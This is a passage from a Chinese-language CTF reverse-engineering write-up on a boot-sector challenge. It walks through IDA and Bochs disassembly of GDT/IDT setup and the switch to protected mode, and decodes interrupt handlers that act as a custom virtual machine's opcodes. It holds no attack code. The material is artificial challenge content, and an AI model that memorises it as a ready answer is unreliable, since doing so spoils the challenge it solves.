class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">MBR16:0000 sub_0           proc near</span><br><span class="line">MBR16:0000                 jmp     far ptr 7C0h:5</span><br><span class="line">MBR16:0000 sub_0           endp</span><br><span class="line">MBR16:0000</span><br><span class="line">MBR16:0005</span><br><span class="line">MBR16:0005 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">MBR16:0005</span><br><span class="line">MBR16:0005</span><br><span class="line">MBR16:0005 sub_5           proc near</span><br><span class="line">MBR16:0005                 mov     ax, cs</span><br><span class="line">MBR16:0007                 mov     ds, ax</span><br><span class="line">MBR16:0009                 assume ds:MBR16</span><br><span class="line">MBR16:0009                 mov     ss, ax</span><br><span class="line">MBR16:000B                 assume ss:MBR16</span><br><span class="line">MBR16:000B                 mov     sp, 400h</span><br><span class="line">MBR16:000E                 cld</span><br><span class="line">MBR16:000F                 mov     ax, 3</span><br><span class="line">MBR16:0012                 int     10h             ; - VIDEO - SET VIDEO MODE</span><br><span class="line">MBR16:0012                                         ; AL = mode</span><br><span class="line">MBR16:0014                 mov     dx, 0</span><br><span class="line">MBR16:0017                 mov     cx, 2</span><br><span class="line">MBR16:001A                 mov     ax, 1000h</span><br><span class="line">MBR16:001D                 mov     es, ax</span><br><span class="line">MBR16:001F                 assume es:nothing</span><br><span class="line">MBR16:001F                 xor     bx, bx</span><br><span class="line">MBR16:0021                 mov     ax, 228h</span><br><span class="line">MBR16:0024                 int     13h             ; DISK - READ SECTORS INTO MEMORY</span><br><span class="line">MBR16:0024                                         ; AL = number of sectors to read, CH = track, CL = sector</span><br><span class="line">MBR16:0024                                         ; DH = head, DL = drive, ES:BX -&gt; buffer to fill</span><br><span class="line">MBR16:0024                                         ; Return: CF set on error, AH = status, AL = number of sectors read</span><br><span class="line">MBR16:0026                 jnb     short loc_2A</span><br><span class="line">MBR16:0028</span><br><span class="line">MBR16:0028 loc_28:                                 ; CODE XREF: sub_5:loc_28↓j</span><br><span class="line">MBR16:0028                 jmp     short loc_28</span><br><span class="line">MBR16:002A ; ---------------------------------------------------------------------------</span><br><span class="line">MBR16:002A</span><br><span class="line">MBR16:002A loc_2A:                                 ; CODE XREF: sub_5+21↑j</span><br><span class="line">MBR16:002A                 cli</span><br><span class="line">MBR16:002B                 mov     ax, 1000h</span><br><span class="line">MBR16:002E                 mov     ds, ax</span><br><span class="line">MBR16:0030                 assume ds:nothing</span><br><span class="line">MBR16:0030                 xor     ax, ax</span><br><span class="line">MBR16:0032                 mov     es, ax</span><br><span class="line">MBR16:0034                 assume es:MBR16</span><br><span class="line">MBR16:0034                 mov     cx, 2000h</span><br><span class="line">MBR16:0037                 sub     si, si</span><br><span class="line">MBR16:0039                 sub     di, di</span><br><span class="line">MBR16:003B                 rep movsb</span><br><span class="line">MBR16:003D                 mov     ax, 7C0h</span><br><span class="line">MBR16:0040</span><br><span class="line">MBR16:0040 loc_40:                                 ; DATA XREF: sub_5+D↑r</span><br><span class="line">MBR16:0040                 mov     ds, ax</span><br><span class="line">MBR16:0042                 assume ds:nothing</span><br><span class="line">MBR16:0042                 lidt    fword ptr ds:6Fh ; Init IDT</span><br><span class="line">MBR16:0047                 lgdt    fword ptr ds:75h ; Init GDT</span><br><span class="line">MBR16:004C</span><br><span class="line">MBR16:004C loc_4C:                                 ; DATA XREF: sub_5+1F↑r</span><br><span class="line">MBR16:004C                 mov     ax, 1            ; Start Protected Mode</span><br><span class="line">MBR16:004F                 lmsw    ax               ; Jump to 32-bit Code</span><br><span class="line">MBR16:004F sub_5           endp</span><br><span class="line">MBR16:004F</span><br><span class="line">MBR16:004F MBR16           ends</span><br></pre></td></tr></table></figure><blockquote><h2 id="何为-IDT-和-GDT？"><a href="#何为-IDT-和-GDT？" class="headerlink" title="何为 IDT 和 GDT？"></a>何为 IDT 和 GDT？</h2><h3 id="GDT"><a href="#GDT" class="headerlink" title="GDT"></a>GDT</h3><p>全局描述表（Global Descriptor Table）。在实时模式下，对一个内存地址的访问是通过段寄存器的方式来进行（一个段具备两个元素：[Base Address, Limit]），即段模式。而在保护模式下（保护模式运行在 32 位系统上），内存的管理模式分为两种，段模式和页模式，其中页模式也是基于段模式的（纯段模式和段页模式）。</p><p>在保护模式下，对一个段的描述则包括 3 方面因素：[Base Address, Limit, Access]，它们加在一起被放在一个 64-bit 长的数据结构中，被称为段描述符。而段寄存器仍然是 16-bit，无法通过 16-bit 长度的段寄存器来直接引用 64-bit 的段描述符。</p><p>解决方法就是把这些长度为 64-bit 的段描述符放入一个数组即 GDT 中。当程序员通过段寄存器来引用一个段描述符时，CPU 必须知道 GDT 的入口，也就是基地址放在哪里，所以 Intel 的设计者门提供了一个寄存器 GDTR 用来存放 GDT 的入口地址，程序员将 GDT 设定在内存中某个位置之后，可以通过 LGDT 指令将 GDT 的入口地址装入此寄存器，从此以后，CPU 就根据此寄存器中的内容作为 GDT 的入口来访问 GDT 了。</p><h3 id="IDT"><a href="#IDT" class="headerlink" title="IDT"></a>IDT</h3><p>中断描述符表（Interrupt Descriptor Table），和 GDT 类似，记录了 0~255 的中断号和调用函数之间的关系。</p><p>段描述符使用数组存储，使用 LIDT 指令将 IDT 的入口地址装入 IDTR 寄存器。</p></blockquote><p>接下来在 IDA 中用 32 位模式打开。一开始的一段代码对 IDT 和 GDT 进行了初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">seg001:00000205 sub_205         proc near</span><br><span class="line">seg001:00000205                 mov     ds, eax</span><br><span class="line">seg001:00000207                 lss     esp, fword ptr ds:dword_B34+28h</span><br><span class="line">seg001:0000020E                 call    IDT_Init</span><br><span class="line">seg001:00000213                 call    GDT_Init</span><br><span class="line">seg001:00000218                 mov     eax, 10h        ; DATA XREF: sub_28B+27↓r</span><br><span class="line">seg001:0000021D                 mov     ds, eax</span><br><span class="line">seg001:0000021F                 assume ds:nothing</span><br><span class="line">seg001:0000021F                 mov     es, eax</span><br><span class="line">seg001:00000221                 assume es:nothing</span><br><span class="line">seg001:00000221                 mov     fs, eax         ; DATA XREF: sub_283↓r</span><br><span class="line">seg001:00000223                 assume fs:nothing</span><br><span class="line">seg001:00000223                 mov     gs, eax</span><br><span class="line">seg001:00000225                 assume gs:nothing</span><br><span class="line">seg001:00000225                 lss     esp, large ds:0B5Ch</span><br><span class="line">seg001:00000225                                         ; DATA XREF: sub_28B+11↓o</span><br><span class="line">seg001:0000022C                 xor     ebx, ebx</span><br></pre></td></tr></table></figure><p>IDT_init 处，先将 000800FC 赋给了 EAX，将 8E00 赋给了 DX。然后进行了一个 256 次的循环，每次循环从 00080128 的地址开始，分别存入 EAX 和 EDX。最后加载 IDTR，地址为 11C。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">seg001:0000028B IDT_Init        proc near               ; CODE XREF: sub_205+9↑p</span><br><span class="line">seg001:0000028B                 mov     edx, 0FCh</span><br><span class="line">seg001:00000290                 mov     eax, 80000h</span><br><span class="line">seg001:00000295                 mov     ax, dx</span><br><span class="line">seg001:00000298                 mov     dx, 8E00h</span><br><span class="line">seg001:0000029C                 lea     edi, ds:128h</span><br><span class="line">seg001:000002A2                 mov     ecx, 100h</span><br><span class="line">seg001:000002A7</span><br><span class="line">seg001:000002A7 loc_2A7:                                ; CODE XREF: IDT_Init+25↓j</span><br><span class="line">seg001:000002A7                 mov     [edi], eax</span><br><span class="line">seg001:000002A9                 mov     [edi+4], edx</span><br><span class="line">seg001:000002AC                 add     edi, 8</span><br><span class="line">seg001:000002AF                 dec     ecx</span><br><span class="line">seg001:000002B0                 jnz     short loc_2A7</span><br><span class="line">seg001:000002B2                 lidt    large fword ptr ds:11Ch</span><br><span class="line">seg001:000002B9                 retn</span><br><span class="line">seg001:000002B9 IDT_Init        endp</span><br></pre></td></tr></table></figure><p>在 bogus 中调试得到 IDTR 中的值为 0x012807ff（可以使用 show mode 命令来判断实模式向保护模式的转换）。依据之前的知识，可以知道基址为 0x0128 以及长度为 0x07ff：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:40&gt; x 0x11c</span><br><span class="line">[bochs]:</span><br><span class="line">0x000000000000011c &lt;bogus+       0&gt;:0x012807ff</span><br></pre></td></tr></table></figure><p>中断门描述符被初始化为 <code>0000 8e00 0008 00fc</code>（偏移：0xfc；段选择符：0x8；P：1，即段是否在内存；DPL：0），如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:79&gt; x/20 0x128</span><br><span class="line">[bochs]:</span><br><span class="line">0x0000000000000128 &lt;bogus+       0&gt;:0x000800fc0x00008e000x000800fc0x00008e00</span><br><span class="line">0x0000000000000138 &lt;bogus+      16&gt;:0x000800fc0x00008e000x000800fc0x00008e00</span><br><span class="line">0x0000000000000148 &lt;bogus+      32&gt;:0x000800fc0x00008e000x000800fc0x00008e00</span><br><span class="line">0x0000000000000158 &lt;bogus+      48&gt;:0x000800fc0x00008e000x000800fc0x00008e00</span><br><span class="line">0x0000000000000168 &lt;bogus+      64&gt;:0x000800fc0x00008e000x000800fc0x00008e00</span><br></pre></td></tr></table></figure><p>GDT_init 处，加载 GDTR 的地址为 122：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seg001:00000283 GDT_Init        proc near               ; CODE XREF: sub_205+E↑p</span><br><span class="line">seg001:00000283                 lgdt    large fword ptr ds:122h</span><br><span class="line">seg001:0000028A                 retn</span><br><span class="line">seg001:0000028A GDT_Init        endp</span><br></pre></td></tr></table></figure><p>同理，可以知道 GDT 基址为 0x0928 以及长度为 0x001f。不过这里没有对 GDT 进行初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:74&gt; x 0x122</span><br><span class="line">[bochs]:</span><br><span class="line">0x0000000000000122 &lt;bogus+       0&gt;:0x0928001f</span><br></pre></td></tr></table></figure><p>在 22E~25F 的代码执行了一个 16 次的循环，其中 0x21~0x30 的中断向量描述符在内存的原始位置在 D08 处，循环中将每个中断向量存储到 128 处；然后调用了 NextHandler 函数，最后调用 <code>INT 21H</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">seg001:0000022E loc_22E:                                ; CODE XREF: sub_205+58↓j</span><br><span class="line">seg001:0000022E                 nop</span><br><span class="line">seg001:0000022F                 cmp     ebx, 10h</span><br><span class="line">seg001:00000232                 jge     short loc_25F</span><br><span class="line">seg001:00000234                 mov     eax, 80000h</span><br><span class="line">seg001:00000239                 lea     edx, ds:0D08h[ebx*4]</span><br><span class="line">seg001:00000240                 mov     edx, [edx]</span><br><span class="line">seg001:00000242                 mov     ax, dx</span><br><span class="line">seg001:00000245                 mov     dx, 8E00h</span><br><span class="line">seg001:00000249                 mov     ecx, 21h ; &apos;!&apos;</span><br><span class="line">seg001:0000024E                 add     ecx, ebx</span><br><span class="line">seg001:00000250                 lea     esi, ds:128h[ecx*8]</span><br><span class="line">seg001:00000257                 mov     [esi], eax</span><br><span class="line">seg001:00000259                 mov     [esi+4], edx</span><br><span class="line">seg001:0000025C                 inc     ebx</span><br><span class="line">seg001:0000025D                 jmp     short loc_22E</span><br><span class="line">seg001:0000025F ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:0000025F</span><br><span class="line">seg001:0000025F loc_25F:                                ; CODE XREF: sub_205+2D↑j</span><br><span class="line">seg001:0000025F                                         ; sub_205+61↓j</span><br><span class="line">seg001:0000025F                 call    NextHandler</span><br><span class="line">seg001:00000264                 int     21h             ; DOS -</span><br><span class="line">seg001:00000266                 jmp     short loc_25F</span><br><span class="line">seg001:00000266 sub_205         endp</span><br></pre></td></tr></table></figure><p>获取得到所有中断向量的地址如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">IDT[0x21]=32-Bit Interrupt Gate target=0x0008:0x00000b7c, DPL=0</span><br><span class="line">IDT[0x22]=32-Bit Interrupt Gate target=0x0008:0x00000b8a, DPL=0</span><br><span class="line">IDT[0x23]=32-Bit Interrupt Gate target=0x0008:0x00000ba1, DPL=0</span><br><span class="line">IDT[0x24]=32-Bit Interrupt Gate target=0x0008:0x00000bc1, DPL=0</span><br><span class="line">IDT[0x25]=32-Bit Interrupt Gate target=0x0008:0x00000be1, DPL=0</span><br><span class="line">IDT[0x26]=32-Bit Interrupt Gate target=0x0008:0x00000bfc, DPL=0</span><br><span class="line">IDT[0x27]=32-Bit Interrupt Gate target=0x0008:0x00000c17, DPL=0</span><br><span class="line">IDT[0x28]=32-Bit Interrupt Gate target=0x0008:0x00000c32, DPL=0</span><br><span class="line">IDT[0x29]=32-Bit Interrupt Gate target=0x0008:0x00000c4f, DPL=0</span><br><span class="line">IDT[0x2a]=32-Bit Interrupt Gate target=0x0008:0x00000c6c, DPL=0</span><br><span class="line">IDT[0x2b]=32-Bit Interrupt Gate target=0x0008:0x00000c84, DPL=0</span><br><span class="line">IDT[0x2c]=32-Bit Interrupt Gate target=0x0008:0x00000c96, DPL=0</span><br><span class="line">IDT[0x2d]=32-Bit Interrupt Gate target=0x0008:0x00000cb5, DPL=0</span><br><span class="line">IDT[0x2e]=32-Bit Interrupt Gate target=0x0008:0x00000cf7, DPL=0</span><br><span class="line">IDT[0x2f]=32-Bit Interrupt Gate target=0x0008:0x00000ce0, DPL=0</span><br><span class="line">IDT[0x30]=32-Bit Interrupt Gate target=0x0008:0x00000cd4, DPL=0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在 IDA 中定位到所有中断向量的地址，分别对应着不同的函数，这一段代码后面会用到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">seg001:00000D7C                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000D83                 mov     [ecx], eax</span><br><span class="line">seg001:00000D85                 jmp     loc_EF8</span><br><span class="line">seg001:00000D8A ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000D8A                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000D91                 mov     eax, [eax]</span><br><span class="line">seg001:00000D93                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000D9A                 mov     [ecx], eax</span><br><span class="line">seg001:00000D9C                 jmp     loc_EF8</span><br><span class="line">seg001:00000DA1 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000DA1                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000DA8                 mov     eax, [eax]</span><br><span class="line">seg001:00000DAA                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000DB1                 lea     eax, ds:0D48h[eax*4]</span><br><span class="line">seg001:00000DB8                 mov     eax, [eax]</span><br><span class="line">seg001:00000DBA                 mov     [ecx], eax</span><br><span class="line">seg001:00000DBC                 jmp     loc_EF8</span><br><span class="line">seg001:00000DC1 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000DC1                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000DC8                 mov     eax, [eax]</span><br><span class="line">seg001:00000DCA                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000DD1                 mov     ecx, [ecx]</span><br><span class="line">seg001:00000DD3                 lea     ecx, ds:0D48h[ecx*4]</span><br><span class="line">seg001:00000DDA                 mov     [ecx], eax</span><br><span class="line">seg001:00000DDC                 jmp     loc_EF8</span><br><span class="line">seg001:00000DE1 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000DE1                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000DE8                 mov     edx, [eax]</span><br><span class="line">seg001:00000DEA                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000DF1                 mov     eax, [ecx]</span><br><span class="line">seg001:00000DF3                 add     eax, edx</span><br><span class="line">seg001:00000DF5                 mov     [ecx], eax</span><br><span class="line">seg001:00000DF7                 jmp     loc_EF8</span><br><span class="line">seg001:00000DFC ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000DFC                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E03                 mov     edx, [eax]</span><br><span class="line">seg001:00000E05                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E0C                 mov     eax, [ecx]</span><br><span class="line">seg001:00000E0E                 sub     eax, edx</span><br><span class="line">seg001:00000E10                 mov     [ecx], eax</span><br><span class="line">seg001:00000E12                 jmp     loc_EF8</span><br><span class="line">seg001:00000E17 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E17                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E1E                 mov     edx, [eax]</span><br><span class="line">seg001:00000E20                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E27                 mov     eax, [ecx]</span><br><span class="line">seg001:00000E29                 xor     eax, edx</span><br><span class="line">seg001:00000E2B                 mov     [ecx], eax</span><br><span class="line">seg001:00000E2D                 jmp     loc_EF8</span><br><span class="line">seg001:00000E32 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E32                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E39                 mov     eax, [eax]</span><br><span class="line">seg001:00000E3B                 lea     edx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E42                 mov     cl, al</span><br><span class="line">seg001:00000E44                 mov     eax, [edx]</span><br><span class="line">seg001:00000E46                 shl     eax, cl</span><br><span class="line">seg001:00000E48                 mov     [edx], eax</span><br><span class="line">seg001:00000E4A                 jmp     loc_EF8</span><br><span class="line">seg001:00000E4F ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E4F                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E56                 mov     eax, [eax]</span><br><span class="line">seg001:00000E58                 lea     edx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E5F                 mov     cl, al</span><br><span class="line">seg001:00000E61                 mov     eax, [edx]</span><br><span class="line">seg001:00000E63                 shr     eax, cl</span><br><span class="line">seg001:00000E65                 mov     [edx], eax</span><br><span class="line">seg001:00000E67                 jmp     loc_EF8</span><br><span class="line">seg001:00000E6C ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E6C                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E73                 mov     eax, [eax]</span><br><span class="line">seg001:00000E75                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E7C                 mov     edx, [ecx]</span><br><span class="line">seg001:00000E7E                 and     eax, edx</span><br><span class="line">seg001:00000E80                 mov     [ecx], eax</span><br><span class="line">seg001:00000E82                 jmp     short loc_EF8</span><br><span class="line">seg001:00000E84 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E84                 lea     eax, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E8B                 mov     eax, [eax]</span><br><span class="line">seg001:00000E8D                 lea     ecx, dword_B34+44h</span><br><span class="line">seg001:00000E93                 mov     [ecx], eax</span><br><span class="line">seg001:00000E95                 iret</span><br><span class="line">seg001:00000E96 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E96                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E9D                 mov     eax, [eax]</span><br><span class="line">seg001:00000E9F                 test    eax, eax</span><br><span class="line">seg001:00000EA1                 jnz     short loc_EF8</span><br><span class="line">seg001:00000EA3                 lea     eax, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000EAA                 mov     eax, [eax]</span><br><span class="line">seg001:00000EAC                 lea     ecx, dword_B34+44h</span><br><span class="line">seg001:00000EB2                 mov     [ecx], eax</span><br><span class="line">seg001:00000EB4                 iret</span><br><span class="line">seg001:00000EB5 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000EB5                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000EBC                 mov     eax, [eax]</span><br><span class="line">seg001:00000EBE                 test    eax, eax</span><br><span class="line">seg001:00000EC0                 jz      short loc_EF8</span><br><span class="line">seg001:00000EC2                 lea     eax, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000EC9                 mov     eax, [eax]</span><br><span class="line">seg001:00000ECB                 lea     ecx, dword_B34+44h</span><br><span class="line">seg001:00000ED1                 mov     [ecx], eax</span><br><span class="line">seg001:00000ED3                 iret</span><br><span class="line">seg001:00000ED4 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000ED4                 lea     eax, unk_F94</span><br><span class="line">seg001:00000EDA                 call    sub_2EA</span><br><span class="line">seg001:00000EDF                 hlt</span><br><span class="line">seg001:00000EE0 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000EE0                 lea     eax, unk_FA0</span><br><span class="line">seg001:00000EE6                 call    sub_2EA</span><br><span class="line">seg001:00000EEB                 lea     eax, word_FAE</span><br><span class="line">seg001:00000EF1                 call    sub_2EA</span><br><span class="line">seg001:00000EF6                 hlt</span><br></pre></td></tr></table></figure><p>接下来在 NextHandler 处，包括 <code>INT 21H</code> 的三条指令，类似于一个 switch 语句，根据以前的做题经验，基本可以判断出是个虚拟机。在 NextHandler 函数中，首先从 B78 处获取值作为 D48 的偏移，将 D48 处的值分别赋值给 给 065（操作符）、ecx（操作数 1）、eax（操作数 2），而 065 地址处的值为 21H，即指令 <code>INT 21H</code> 的操作数，故这里中断的调用是和 edi 的取值有关系的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">seg001:00000268 NextHandler     proc near               ; CODE XREF: sub_205:loc_25F↑p</span><br><span class="line">seg001:00000268                 mov     edi, large ds:0B78h</span><br><span class="line">seg001:0000026E                 lea     edi, ds:0D48h[edi*4]</span><br><span class="line">seg001:00000275                 mov     eax, [edi]</span><br><span class="line">seg001:00000277                 mov     large ds:65h, al</span><br><span class="line">seg001:0000027C                 mov     ecx, [edi+4]</span><br><span class="line">seg001:0000027F                 mov     eax, [edi+8]</span><br><span class="line">seg001:00000282                 retn</span><br><span class="line">seg001:00000282 NextHandler     endp</span><br></pre></td></tr></table></figure><p>回过去看上面中断代码的最后一部分是将上面 edi 中的值加 3，即取下一组指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">seg001:00000EF8 loc_EF8:                                ; CODE XREF: seg001:00000D85↑j</span><br><span class="line">seg001:00000EF8                                         ; seg001:00000D9C↑j ...</span><br><span class="line">seg001:00000EF8                 lea     ecx, dword_B34+44h</span><br><span class="line">seg001:00000EFE                 mov     eax, [ecx]</span><br><span class="line">seg001:00000F00                 add     eax, 3</span><br><span class="line">seg001:00000F03                 mov     [ecx], eax</span><br><span class="line">seg001:00000F05                 iret</span><br></pre></td></tr></table></figure><p>那么之前的那段代码就是不同的操作符时进行的中断调用。这里就先把每个中断的部分的代码进行翻译（buf 的地址为 B64，code 的地址为 D48，pc 的地址为 B78）：</p><table><thead><tr><th style="text-align:center">中断编号</th><th style="text-align:center">功能描述</th></tr></thead><tbody><tr><td style="text-align:center">0x21</td><td style="text-align:center"><code>buf[a] = b</code></td></tr><tr><td style="text-align:center">0x22</td><td style="text-align:center"><code>buf[a] = buf[b]</code></td></tr><tr><td style="text-align:center">0x23</td><td style="text-align:center"><code>buf[a] = code[buf[b]]</code></td></tr><tr><td style="text-align:center">0x24</td><td style="text-align:center"><code>code[buf[a]] = buf[b]</code></td></tr><tr><td style="text-align:center">0x25</td><td style="text-align:center"><code>buf[a] += buf[b]</code></td></tr><tr><td style="text-align:center">0x26</td><td style="text-align:center"><code>buf[a] -= buf[b]</code></td></tr><tr><td style="text-align:center">0x27</td><td style="text-align:center"><code>buf[a] ^= buf[b]</code></td></tr><tr><td style="text-align:center">0x28</td><td style="text-align:center"><code>buf[a] &lt;&lt;= buf[b]</code></td></tr><tr><td style="text-align:center">0x29</td><td style="text-align:center"><code>buf[a] &gt;&gt;= buf[b]</code></td></tr><tr><td style="text-align:center">0x2A</td><td style="text-align:center"><code>buf[a] &amp;= buf[b]</code></td></tr><tr><td style="text-align:center">0x2B</td><td style="text-align:center"><code>pc = a</code></td></tr><tr><td style="text-align:center">0x2C</td><td style="text-align:center"><code>if(buf[b] == 0) pc = buf[a]</code></td></tr><tr><td style="text-align:center">0x2D</td><td style="text-align:center"><code>if(buf[b] != 0) pc = 